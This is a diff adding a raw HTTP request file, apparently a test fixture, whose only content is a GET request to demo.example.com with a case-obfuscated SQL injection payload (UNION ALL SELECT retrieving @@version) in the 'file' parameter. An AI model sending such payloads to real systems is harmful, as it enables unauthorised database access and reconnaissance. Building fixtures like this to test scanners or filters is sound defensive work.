@@ -1,0 +1,4 @@
+GET /a?file=1%20uNiOn%20AlL%20sElEcT%20nUlL,(sElEcT%20@@vErSiOn),NuLl HTTP/1.1
+Host: demo.example.com
+Connection: close
+
